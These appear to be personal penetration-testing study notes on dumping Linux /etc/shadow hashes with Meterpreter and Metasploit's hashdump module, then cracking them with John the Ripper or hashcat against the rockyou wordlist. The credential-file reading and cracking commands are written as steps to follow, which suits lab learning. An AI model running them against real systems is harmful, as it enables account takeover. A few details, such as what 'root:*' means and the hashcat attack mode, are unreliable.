 linux passwords are stored in the /etc/shadow file and can only be acccessed by the root user or a user with root privs.
 
 the hashdump module can be used to dump the user acc hashes from the /etc/shadow file and can be used to unshadow the hashes for password cracking with John the Ripper
 
 If you have root access already you can just cat /etc/shadow and copy the whole root password hash
 
 **once you have a foothold on the target with an exploit, make sure your session is upgraded to meterpreter**
 sysinfo
 getuid
 shell
 whoami (if root you can dump hashes easily)
 **go back to regular meterpreter session**
 use post/linux/gather/hashdump
 set the right session
 run
 loot
 root:* (asterisk means no password specified)
 **NOW WE MUST CRACK IT**
 gzip -d /usr/share/wordlists/rockyou.txt
 john --format=sha512crypt <file that contains the hash, usually the patch you get from the gather/hashdump module> --wordlist=/usr/share/wordlists/rockyou.txt
 **--format=<encryption method> this must reflect whatever number is in the shadow file for encryption like $1, $2, $5, $6 etc**
 **OR WE CAN USE HASHCAT**
 hashcat --help | grep 1800
 hashcat -a3 -m 1800 <hash location file like above> <wordlist used to crack> 
 **1800 in this command is the format for SHA512, adjust this accordingly**
 
The shadow file gives us an idea of the hashing algorithm being used and the password hash.
We can determine the hashing algorithm by looking at the number after the username encapsulated by the dollar symbol ($)
$1 MD5
$2 Blowfish
$5 SHA-256
$6 SHA-512
